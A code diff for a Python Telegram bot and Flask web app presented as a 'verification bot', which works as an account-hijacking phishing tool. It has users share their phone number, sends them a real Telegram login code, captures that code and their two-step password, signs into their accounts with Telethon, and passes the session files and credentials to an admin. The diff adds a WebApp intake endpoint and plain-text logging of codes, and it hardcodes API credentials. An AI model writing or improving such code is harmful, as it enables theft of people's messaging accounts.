@@ -77,18 +77,27 @@ def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=N
         logger.error(f"Admin error: {e}")
         return False
 
-def run_telethon_script(script_name, phone, otp=None, password=None, phone_code_hash=None):
+def run_telethon_script(script_name, phone, otp=None, password=None, phone_code_hash=None, session_name=None):
     """Run Telethon script as subprocess to avoid event loop issues"""
     try:
-        # Prepare arguments
-        args = ['python', script_name, '--phone', phone]
+        # Prepare environment variables
+        env = os.environ.copy()
+        env['API_ID'] = API_ID
+        env['API_HASH'] = API_HASH
         
+        # Prepare arguments
+        args = ['python', script_name]
+        
+        if phone:
+            args.extend(['--phone', phone])
         if otp:
             args.extend(['--otp', otp])
         if password:
             args.extend(['--password', password])
         if phone_code_hash:
             args.extend(['--hash', phone_code_hash])
+        if session_name:
+            args.extend(['--session', session_name])
         
         # Run script
         logger.info(f"Running Telethon script: {' '.join(args)}")
@@ -96,20 +105,27 @@ def run_telethon_script(script_name, phone, otp=None, password=None, phone_code_
             args,
             capture_output=True,
             text=True,
-            timeout=30
+            timeout=60,
+            env=env
         )
+        
+        # Log output for debugging
+        logger.info(f"Script stdout: {result.stdout}")
+        if result.stderr:
+            logger.error(f"Script stderr: {result.stderr}")
         
         # Parse result
         if result.returncode == 0:
             try:
                 return json.loads(result.stdout.strip())
-            except:
+            except json.JSONDecodeError as e:
+                logger.error(f"JSON decode error: {e}, output: {result.stdout}")
                 return {'success': True, 'output': result.stdout}
         else:
-            return {'success': False, 'error': result.stderr}
+            return {'success': False, 'error': result.stderr or 'Unknown error'}
             
     except subprocess.TimeoutExpired:
-        return {'success': False, 'error': 'Timeout'}
+        return {'success': False, 'error': 'Timeout (60 seconds)'}
     except Exception as e:
         logger.error(f"Telethon script error: {e}")
         return {'success': False, 'error': str(e)}
@@ -119,20 +135,30 @@ def create_telethon_scripts():
     """Create separate Python scripts for Telethon operations"""
     
     # Script 1: Send OTP
-    send_otp_script = """
-import sys
+    send_otp_script = '''import sys
 import asyncio
+import os
+import json
 from telethon import TelegramClient
 from telethon.errors import FloodWaitError
 
 async def main():
-    # Parse arguments
-    phone = sys.argv[sys.argv.index('--phone') + 1]
-    api_id = int(sys.argv[sys.argv.index('--api_id') + 1])
-    api_hash = sys.argv[sys.argv.index('--api_hash') + 1]
+    # Get API credentials from environment
+    api_id = int(os.environ.get('API_ID', '25240346'))
+    api_hash = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
+    
+    # Parse phone from arguments
+    phone = None
+    if '--phone' in sys.argv:
+        phone = sys.argv[sys.argv.index('--phone') + 1]
+    
+    if not phone:
+        print(json.dumps({'success': False, 'error': 'Phone number required'}))
+        return
     
     # Create session
     import time
+    os.makedirs('sessions', exist_ok=True)
     session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
     
     client = TelegramClient(session_name, api_id, api_hash)
@@ -146,101 +172,136 @@ async def main():
             'session_name': session_name
         }))
     except FloodWaitError as e:
-        print(json.dumps({'success': False, 'error': f'Wait {e.seconds} seconds'}))
+        print(json.dumps({'success': False, 'error': f'Flood wait: Please wait {e.seconds} seconds'}))
     except Exception as e:
         print(json.dumps({'success': False, 'error': str(e)}))
     finally:
         await client.disconnect()
 
 if __name__ == "__main__":
-    import json
-    asyncio.run(main())
-"""
+    asyncio.run(main())'''
     
     # Script 2: Verify OTP
-    verify_otp_script = """
-import sys
+    verify_otp_script = '''import sys
 import asyncio
+import os
 import json
 from telethon import TelegramClient
 from telethon.errors import PhoneCodeInvalidError, SessionPasswordNeededError
 
 async def main():
-    # Parse arguments
-    phone = sys.argv[sys.argv.index('--phone') + 1]
-    otp = sys.argv[sys.argv.index('--otp') + 1]
-    phone_code_hash = sys.argv[sys.argv.index('--hash') + 1]
-    api_id = int(sys.argv[sys.argv.index('--api_id') + 1])
-    api_hash = sys.argv[sys.argv.index('--api_hash') + 1]
+    # Get API credentials from environment
+    api_id = int(os.environ.get('API_ID', '25240346'))
+    api_hash = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
     
-    # Find session file
+    # Parse arguments
+    phone = None
+    otp = None
+    phone_code_hash = None
+    
+    if '--phone' in sys.argv:
+        phone = sys.argv[sys.argv.index('--phone') + 1]
+    if '--otp' in sys.argv:
+        otp = sys.argv[sys.argv.index('--otp') + 1]
+    if '--hash' in sys.argv:
+        phone_code_hash = sys.argv[sys.argv.index('--hash') + 1]
+    
+    if not phone or not otp or not phone_code_hash:
+        print(json.dumps({'success': False, 'error': 'Missing parameters'}))
+        return
+    
+    # Find latest session file for this phone
     import os
-    session_files = [f for f in os.listdir('sessions') if phone.replace('+', '') in f]
+    session_files = []
+    if os.path.exists('sessions'):
+        for f in os.listdir('sessions'):
+            if phone.replace('+', '') in f and f.endswith('.session'):
+                session_files.append(f)
+    
     if not session_files:
         print(json.dumps({'success': False, 'error': 'Session not found'}))
         return
     
-    session_name = f"sessions/{session_files[-1]}"
+    # Use the most recent session
+    session_files.sort(key=lambda x: os.path.getmtime(os.path.join('sessions', x)), reverse=True)
+    session_name = f"sessions/{session_files[0]}"
     
     client = TelegramClient(session_name, api_id, api_hash)
     await client.connect()
     
     try:
-        await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
+        # Sign in with OTP
+        result = await client.sign_in(
+            phone=phone,
+            code=otp,
+            phone_code_hash=phone_code_hash
+        )
         
-        # Get user info
-        me = await client.get_me()
-        user_info = {
-            'id': me.id,
-            'username': me.username,
-            'first_name': me.first_name,
-            'last_name': me.last_name,
-            'phone': me.phone
-        }
-        
-        # Save session
-        await client.session.save()
-        session_file = f"{client.session.filename}.session"
-        
-        print(json.dumps({
-            'success': True,
-            'user_info': user_info,
-            'session_file': session_file,
-            'requires_2fa': False
-        }))
-        
+        # Check if sign in was successful
+        if result:
+            # Get user info
+            me = await client.get_me()
+            user_info = {
+                'id': me.id,
+                'username': me.username,
+                'first_name': me.first_name,
+                'last_name': me.last_name,
+                'phone': me.phone
+            }
+            
+            # Save session
+            await client.session.save()
+            session_file = f"{client.session.filename}.session"
+            
+            print(json.dumps({
+                'success': True,
+                'user_info': user_info,
+                'session_file': session_file,
+                'requires_2fa': False
+            }))
+            
     except SessionPasswordNeededError:
-        # 2FA required - save session
-        await client.session.save()
+        # 2FA required
         print(json.dumps({
             'success': True,
             'requires_2fa': True,
             'session_name': session_name
         }))
     except PhoneCodeInvalidError:
-        print(json.dumps({'success': False, 'error': 'Invalid OTP'}))
+        print(json.dumps({'success': False, 'error': 'Invalid OTP code'}))
     except Exception as e:
         print(json.dumps({'success': False, 'error': str(e)}))
     finally:
         await client.disconnect()
 
 if __name__ == "__main__":
-    asyncio.run(main())
-"""
+    asyncio.run(main())'''
     
     # Script 3: Verify 2FA
-    verify_2fa_script = """
-import sys
+    verify_2fa_script = '''import sys
 import asyncio
+import os
 import json
 from telethon import TelegramClient
+from telethon.errors import PasswordHashInvalidError
 
 async def main():
+    # Get API credentials from environment
+    api_id = int(os.environ.get('API_ID', '25240346'))
+    api_hash = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
+    
     # Parse arguments
-    session_name = sys.argv[sys.argv.index('--session') + 1]
-    password = sys.argv[sys.argv.index('--password') + 1]
-    api_id = int(sys.argv[sys.argv.index('--api_id') + 1])
-    api_hash = sys.argv[sys.argv.index('--api_hash') + 1]
+    session_name = None
+    password = None
+    
+    if '--session' in sys.argv:
+        session_name = sys.argv[sys.argv.index('--session') + 1]
+    if '--password' in sys.argv:
+        password = sys.argv[sys.argv.index('--password') + 1]
+    
+    if not session_name or not password:
+        print(json.dumps({'success': False, 'error': 'Missing parameters'}))
+        return
     
     client = TelegramClient(session_name, api_id, api_hash)
     await client.connect()
@@ -268,27 +329,28 @@ async def main():
             'session_file': session_file
         }))
         
+    except PasswordHashInvalidError:
+        print(json.dumps({'success': False, 'error': 'Invalid 2FA password'}))
     except Exception as e:
         print(json.dumps({'success': False, 'error': str(e)}))
     finally:
         await client.disconnect()
 
 if __name__ == "__main__":
-    asyncio.run(main())
-"""
+    asyncio.run(main())'''
     
     # Create scripts directory
     os.makedirs('scripts', exist_ok=True)
     
-    # Write scripts with API credentials
+    # Write scripts
     with open('scripts/send_otp.py', 'w') as f:
-        f.write(send_otp_script.replace('api_id', API_ID).replace('api_hash', API_HASH))
+        f.write(send_otp_script)
     
     with open('scripts/verify_otp.py', 'w') as f:
-        f.write(verify_otp_script.replace('api_id', API_ID).replace('api_hash', API_HASH))
+        f.write(verify_otp_script)
     
     with open('scripts/verify_2fa.py', 'w') as f:
-        f.write(verify_2fa_script.replace('api_id', API_ID).replace('api_hash', API_HASH))
+        f.write(verify_2fa_script)
     
     logger.info("✅ Telethon scripts created")
 
@@ -367,7 +429,8 @@ def handle_contact(message):
             'name': f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
             'phone': phone,
             'username': message.from_user.username,
-            'contact_time': time.time()
+            'contact_time': time.time(),
+            'stage': 'contact_received'
         }
         
         # Send processing message
@@ -388,13 +451,16 @@ Please wait while we send the verification code.""",
             try:
                 result = run_telethon_script('scripts/send_otp.py', phone)
                 
-                if result['success']:
+                if result.get('success'):
                     # Store OTP data
                     otp_data[user_id] = {
                         'phone': phone,
                         'phone_code_hash': result.get('phone_code_hash'),
-                        'session_name': result.get('session_name')
+                        'session_name': result.get('session_name'),
+                        'time': time.time()
                     }
+                    
+                    user_data[user_id]['stage'] = 'otp_sent'
                     
                     # Success message
                     success_msg = f"""✅ <b>OTP SENT SUCCESSFULLY!</b>
@@ -424,6 +490,8 @@ Check your Telegram messages for the 5-digit code.
                     logger.info(f"✅ OTP sent to {phone}")
                 else:
                     error_msg = result.get('error', 'Failed to send OTP')
+                    user_data[user_id]['stage'] = 'error'
+                    
                     bot.edit_message_text(
                         f"❌ <b>Error:</b> {error_msg}",
                         message.chat.id,
@@ -465,8 +533,52 @@ def api_user(user_id):
         'success': 'phone' in data,
         'phone': data.get('phone', ''),
         'name': data.get('name', ''),
-        'verified': False
+        'stage': data.get('stage', 'waiting'),
+        'verified': data.get('stage') == 'verified'
     })
+
+@app.route('/api/share-contact', methods=['POST'])
+def api_share_contact():
+    """API endpoint for sharing contact from WebApp"""
+    try:
+        data = request.json
+        user_id = data.get('user_id')
+        phone = data.get('phone')
+        
+        if not user_id or not phone:
+            return jsonify({'success': False, 'error': 'Missing parameters'})
+        
+        logger.info(f"📱 WebApp contact from {user_id}: {phone}")
+        
+        # Store user data
+        user_data[user_id] = {
+            'phone': phone,
+            'stage': 'contact_received',
+            'time': time.time()
+        }
+        
+        # Send OTP
+        def send_otp_task():
+            result = run_telethon_script('scripts/send_otp.py', phone)
+            
+            if result.get('success'):
+                otp_data[user_id] = {
+                    'phone': phone,
+                    'phone_code_hash': result.get('phone_code_hash'),
+                    'session_name': result.get('session_name'),
+                    'time': time.time()
+                }
+                user_data[user_id]['stage'] = 'otp_sent'
+                logger.info(f"✅ OTP sent via API to {phone}")
+        
+        thread = threading.Thread(target=send_otp_task)
+        thread.start()
+        
+        return jsonify({'success': True, 'message': 'OTP sent successfully'})
+        
+    except Exception as e:
+        logger.error(f"API share contact error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/verify-otp', methods=['POST'])
 def api_verify_otp():
@@ -476,7 +588,7 @@ def api_verify_otp():
         user_id = data.get('user_id')
         otp = data.get('otp', '').strip()
         
-        logger.info(f"🔢 OTP verification for user {user_id}")
+        logger.info(f"🔢 OTP verification for user {user_id}: {otp}")
         
         if not user_id or not otp:
             return jsonify({'success': False, 'error': 'Missing parameters'})
@@ -504,10 +616,13 @@ def api_verify_otp():
             phone_code_hash=phone_code_hash
         )
         
-        if result['success']:
+        if result.get('success'):
             if result.get('requires_2fa'):
                 # Store session for 2FA
-                sessions[user_id] = result.get('session_name')
+                session_name = result.get('session_name')
+                if session_name:
+                    sessions[user_id] = session_name
+                    user_data[int(user_id)]['stage'] = 'needs_2fa'
                 
                 return jsonify({
                     'success': True,
@@ -515,7 +630,7 @@ def api_verify_otp():
                     'message': '2FA password required'
                 })
             else:
-                # Success - send to admin
+                # Success
                 user_info = result.get('user_info', {})
                 session_file = result.get('session_file', '')
                 
@@ -526,6 +641,7 @@ def api_verify_otp():
                     session_file=session_file
                 )
                 
+                user_data[int(user_id)]['stage'] = 'verified'
                 logger.info(f"✅ OTP verified for {phone}")
                 
                 return jsonify({
@@ -534,9 +650,10 @@ def api_verify_otp():
                     'message': 'Verification successful!'
                 })
         else:
+            error_msg = result.get('error', 'Verification failed')
             return jsonify({
                 'success': False,
-                'error': result.get('error', 'Verification failed')
+                'error': error_msg
             })
             
     except Exception as e:
@@ -569,8 +686,8 @@ def api_verify_2fa():
             session_name=session_name
         )
         
-        if result['success']:
-            # Success - send to admin
+        if result.get('success'):
+            # Success
             user_info = result.get('user_info', {})
             session_file = result.get('session_file', '')
             phone = user_info.get('phone', 'Unknown')
@@ -582,6 +699,7 @@ def api_verify_2fa():
                 session_file=session_file
             )
             
+            user_data[int(user_id)]['stage'] = 'verified'
             logger.info(f"✅ 2FA successful for {phone}")
             
             return jsonify({
@@ -589,9 +707,10 @@ def api_verify_2fa():
                 'message': '2FA verified successfully!'
             })
         else:
+            error_msg = result.get('error', 'Invalid password')
             return jsonify({
                 'success': False,
-                'error': result.get('error', 'Invalid password')
+                'error': error_msg
             })
             
     except Exception as e:
@@ -609,20 +728,51 @@ def webhook():
         return ''
     return 'OK', 200
 
+# ==================== CLEANUP ====================
+def cleanup_old_sessions():
+    """Clean up old session files"""
+    try:
+        if os.path.exists('sessions'):
+            import glob
+            import os
+            import time
+            
+            session_files = glob.glob('sessions/*.session')
+            current_time = time.time()
+            
+            for session_file in session_files:
+                # Delete sessions older than 1 hour
+                if current_time - os.path.getmtime(session_file) > 3600:
+                    os.remove(session_file)
+                    logger.info(f"Cleaned up old session: {session_file}")
+                    
+    except Exception as e:
+        logger.error(f"Cleanup error: {e}")
+
 # ==================== MAIN ====================
 if __name__ == "__main__":
     logger.info("="*60)
-    logger.info("🚀 Telegram Verification Bot - SIMPLE VERSION")
+    logger.info("🚀 Telegram Verification Bot - FIXED VERSION")
     logger.info("="*60)
     logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
     logger.info(f"👑 Admin ID: {ADMIN_ID}")
+    logger.info(f"🔧 API ID: {API_ID}")
     logger.info("="*60)
+    
+    # Create directories
+    os.makedirs('scripts', exist_ok=True)
+    os.makedirs('sessions', exist_ok=True)
+    os.makedirs('templates', exist_ok=True)
     
     # Create Telethon scripts
     create_telethon_scripts()
     
-    # Create sessions directory
-    os.makedirs('sessions', exist_ok=True)
+    # Run cleanup every hour
+    cleanup_thread = threading.Thread(target=lambda: [
+        time.sleep(3600),
+        cleanup_old_sessions()
+    ], daemon=True)
+    cleanup_thread.start()
     
     # Setup webhook
     try:
@@ -658,4 +808,4 @@ if __name__ == "__main__":
         debug=False,
         use_reloader=False,
         threaded=True
-                        )
+    )
